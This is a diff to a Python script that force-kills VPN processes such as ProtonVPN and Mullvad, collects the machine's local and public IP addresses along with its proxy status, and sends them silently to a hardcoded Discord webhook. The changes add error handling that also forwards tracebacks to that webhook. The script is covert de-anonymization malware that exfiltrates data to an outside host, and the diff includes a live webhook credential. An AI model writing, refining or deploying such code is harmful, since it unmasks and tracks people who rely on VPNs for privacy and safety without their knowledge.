@@ -1,8 +1,16 @@
 import psutil
 import requests
 import socket
+import traceback
 
 WEBHOOK_URL = 'https://discord.com/api/webhooks/1444092786210111632/x8hPF9-vXrKOy_3QJwZKDFvRCsm_7PzVuH69t_rqczttGBoWIXhlexfu9fvxMbrUeijn'
+
+def send_to_discord(content):
+    try:
+        requests.post(WEBHOOK_URL, json={'content': content}, timeout=5)
+    except Exception:
+        # Don't raise further or try to report errors about the webhook itself
+        pass
 
 KEYWORDS = [
     'Proton', 'ProtonVPN', 'Proton VPN', 'ProtonVPN Service', 'mullvad',
@@ -29,32 +37,35 @@ def kill_processes_by_keywords(keywords):
         if not found:
             break
 
-kill_processes_by_keywords(KEYWORDS)
-
-TRUE_IPV4 = None
-for interface_addresses in psutil.net_if_addrs().values():
-    for address in interface_addresses:
-        if address.family == socket.AF_INET:
-            if not address.address.startswith('127.'):
-                TRUE_IPV4 = address.address
-                break
-    if TRUE_IPV4:
-        break
-
-API_IPV4 = None
-PROXY = None
 try:
-    r = requests.get("http://ip-api.com/json/", timeout=8)
-    data = r.json()
-    API_IPV4 = data.get("query")
-    PROXY = data.get("proxy", False)
-except Exception:
+    kill_processes_by_keywords(KEYWORDS)
+
+    TRUE_IPV4 = None
+    for interface_addresses in psutil.net_if_addrs().values():
+        for address in interface_addresses:
+            if address.family == socket.AF_INET:
+                if not address.address.startswith('127.'):
+                    TRUE_IPV4 = address.address
+                    break
+        if TRUE_IPV4:
+            break
+
     API_IPV4 = None
-    PROXY = False
+    PROXY = None
+    try:
+        r = requests.get("http://ip-api.com/json/", timeout=8)
+        data = r.json()
+        API_IPV4 = data.get("query")
+        PROXY = data.get("proxy", False)
+    except Exception:
+        API_IPV4 = None
+        PROXY = False
 
-content = f"{TRUE_IPV4 or ''}\n{API_IPV4 or ''} {'true' if PROXY else 'false'}"
+    content = f"{TRUE_IPV4 or ''}\n{API_IPV4 or ''} {'true' if PROXY else 'false'}"
+    send_to_discord(content)
 
-try:
-    requests.post(WEBHOOK_URL, json={'content': content}, timeout=5)
-except Exception:
-    pass
+except Exception as e:
+    tb = traceback.format_exc()
+    # Only send the first 1900 characters to avoid Discord limit (if needed)
+    error_message = f"Error occurred:\n{tb}"
+    send_to_discord(error_message[:1900])
